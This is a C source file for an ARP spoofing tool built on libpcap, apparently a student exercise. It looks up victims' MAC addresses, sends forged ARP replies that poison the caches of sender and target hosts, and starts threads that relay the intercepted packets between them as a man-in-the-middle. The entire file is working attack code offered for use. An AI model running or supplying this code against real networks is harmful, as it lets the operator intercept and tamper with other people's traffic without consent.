#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>

#include <pthread.h>
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>

#define ETH_HW_ADDR_LEN 0x06
#define IP_ADDR_LEN     0x04
#define ARP_FRAME_TYPE  0x0806
#define ETHER_HW_TYPE   0x0001
#define IP_PROTO_TYPE   0x0800
#define OP_ARP_REQUEST  0x0002
#define OP_TYPE_REQUEST 0x0001
#define OP_TYPE_REPLY   0x0002

void usage() {
  printf("syntax: pcap_test <interface>\n");
  printf("sample: pcap_test wlan0\n");
}

#pragma pack(1)
struct eth{
	unsigned char des_mac[6];
	unsigned char src_mac[6];
	uint16_t e_type;
	
	eth(){
		e_type=htons(ARP_FRAME_TYPE);
	}

};
struct arp{
	uint16_t a_type;
	uint16_t p_type;
	uint8_t h_size;
	uint8_t p_size;
	uint16_t opcode;
	unsigned char sender_mac[6];
	uint32_t sender_ip;
	unsigned char target_mac[6];
	uint32_t target_ip;

	arp(){
		a_type=htons(ETHER_HW_TYPE);
		p_type=htons(IP_PROTO_TYPE);
		h_size=ETH_HW_ADDR_LEN;
		p_size=IP_ADDR_LEN;
	}
};

struct eth_arp{
	struct eth e;
	struct arp a;
};

struct t_index{
	struct eth_arp s_arp;
	char * dev;
	unsigned char * s_mac;
};
#pragma pack(8)
void debug(struct eth_arp s_arp){
	printf("eth des_mac : ");
	for(int i=0;i<sizeof(s_arp.e.des_mac);i++)printf("%x",s_arp.e.des_mac[i]);
	
	puts("");
	
	printf("eth src_mac : ");
	for(int i=0;i<sizeof(s_arp.e.des_mac);i++)printf("%x",s_arp.e.src_mac[i]);
	puts("");
	printf("eth type : %x\n",s_arp.e.e_type);
	puts("");

	printf("arp a_type : %x\n",s_arp.a.a_type);
	printf("arp p_type : %x\n",s_arp.a.p_type);
	printf("arp h_size : %x\n",s_arp.a.h_size);
	printf("arp p_size : %x\n",s_arp.a.p_size);
	printf("arp opcode : %x\n",s_arp.a.opcode);

	printf("arp sender_mac : ");
	for(int i=0;i<sizeof(s_arp.a.sender_mac);i++)printf("%x",s_arp.a.sender_mac[i]);
	puts("");
	printf("arp sender_ip : %x\n",s_arp.a.sender_ip);
	
	printf("arp target_mac : ");
	for(int i=0;i<sizeof(s_arp.a.target_mac);i++)printf("%x",s_arp.a.target_mac[i]);
	puts("");
	printf("arp taraget_ip : %x\n",s_arp.a.target_ip);
}

struct eth_arp getmac(struct eth_arp s_arp,char * dev){
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    strcpy(s.ifr_name, dev);
    ioctl(fd, SIOCGIFHWADDR, &s);
    int i =0;
    for (i = 0; i < 6; ++i){
    s_arp.e.src_mac[i]=(unsigned char)s.ifr_addr.sa_data[i];
    }
    close(fd);
    return s_arp;
}

uint32_t getIpAddress (const char * ifr) {
    int sockfd;  
    struct ifreq ifrq;  
    struct sockaddr_in * sin;
    uint32_t src_ip;
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);  
    strcpy(ifrq.ifr_name, ifr);  
    if (ioctl(sockfd, SIOCGIFADDR, &ifrq) < 0) {  
        perror( "ioctl() SIOCGIFADDR error");  
        return -1;  
    }  
    sin = (struct sockaddr_in *)&ifrq.ifr_addr;  
    memcpy((uint32_t*)&src_ip,(void*)&sin->sin_addr, sizeof(sin->sin_addr));  
    close(sockfd);  
  
    return src_ip;
}

int check_p(const u_char* packet2,struct eth_arp s_arp){
	struct eth_arp *target=(struct eth_arp*)packet2;
	if(target->e.e_type==s_arp.e.e_type){
//		if(memcmp(target->e.des_mac,"\xff\xff\xff\xff\xff\xff",6)!=-1){
//				printf("BC\n");
			if(target->a.sender_mac!=s_arp.a.target_mac){
				return 0;
			}
	//	}
	}
	return -1;
}
void *thread_main(void *arg){
	struct t_index argv = *(struct t_index *)arg;
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(argv.dev, BUFSIZ, 1, 1000, errbuf);
	struct pcap_pkthdr* header;
	const u_char *packet2,*packet3;
	int res;

	puts("ARP SPOOFING START");
	while(true){
		res = pcap_next_ex(handle, &header, &packet2);	
		if (res == 0) continue;
	    	if (res == -1 || res == -2){
			puts("ERROR");
			break;
		}
		if(check_p(packet2,argv.s_arp)==-1){
			struct eth_arp *t1=(struct eth_arp*)packet2;
			if(memcmp(t1->e.des_mac,argv.s_arp.e.src_mac,6)!=-1){
				for(int i =0;i<6;i++){
  					t1->e.src_mac[i]=argv.s_arp.e.src_mac[i];
					t1->e.des_mac[i]=argv.s_mac[i];
				}
			}
			pcap_sendpacket(handle,(unsigned char *)t1,header->caplen);  //relay
		}else{
  			pcap_sendpacket(handle,(unsigned char *)&argv.s_arp,42); //spoof
		}
	}
	return NULL;	
}

int main(int argc, char* argv[]) {
  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }

  struct pcap_pkthdr* header;
  const u_char* packet2;
  struct eth_arp s_arp;
  int res,ret;
  unsigned char t_mac[6];
  unsigned char t_ip[4];
  unsigned char s_mac[6];
  unsigned char s_ip[4];
  struct t_index argvs;
  int t_len = (argc-2)/2;
  pthread_t t_id[t_len];
    

  for(int i =0, j=0;i<argc/2;i+=2,j++){
  s_arp = getmac(s_arp,dev);
  s_arp.a.sender_ip=getIpAddress(argv[1]);
  memcpy(s_arp.e.des_mac,"\xff\xff\xff\xff\xff\xff",6);
  memcpy(s_arp.a.target_mac,"\x00\x00\x00\00\x00\x00",6);
  memcpy(s_arp.a.sender_mac,s_arp.e.src_mac,6);
  s_arp.a.opcode=0x0100;
  inet_pton(AF_INET,argv[i+2],(uint32_t*)&s_arp.a.target_ip);
  pcap_sendpacket(handle,(const u_char *)&s_arp,42);
  while(true){
  	res = pcap_next_ex(handle, &header, &packet2);	
	if (res == 0) continue;
    	if (res == -1 || res == -2) break;
	memcpy(t_ip,packet2+28,4);
	memcpy(t_mac,packet2+22,6);
	
	if(memcmp((char *)t_ip,(char *)&s_arp.a.target_ip,4)!=-1){		
		break;
	}else{
		continue;
	}
  }
  
  inet_pton(AF_INET,argv[i+3],(uint32_t*)&s_arp.a.target_ip);
  pcap_sendpacket(handle,(const u_char *)&s_arp,42);
  
  while(1){
	res = pcap_next_ex(handle, &header, &packet2);
	if (res == 0) continue;
    	if (res == -1 || res == -2) break;
	memcpy(s_ip,packet2+28,4);
	memcpy(s_mac,packet2+22,6);
	
	if(memcmp((char *)s_ip,(char *)&s_arp.a.target_ip,4)!=-1){
		break;
	}else{
		continue;
	}
  }
  
  s_arp.a.opcode=0x0200;
  memcpy(s_arp.e.des_mac,t_mac,6);
  memcpy(s_arp.a.target_mac,t_mac,6);
  inet_pton(AF_INET,argv[i+3],(uint32_t*)&s_arp.a.sender_ip);
  inet_pton(AF_INET,argv[i+2],(uint32_t*)&s_arp.a.target_ip);
  
  argvs.s_arp = s_arp;
  argvs.dev = dev;
  argvs.s_mac = s_mac;
  pcap_sendpacket(handle,(const u_char *)&s_arp,42);
  if(pthread_create(&t_id[j],NULL,thread_main,(void *)&argvs)!=0){
	puts("thread Error");
	return -1;
  } 
  }
  for(int i =0;i<t_len;i++){
  	pthread_join(t_id[i],(void **)&ret);
  }
  pcap_close(handle);
  printf("arp spoof Success\n");
  return 0;
}
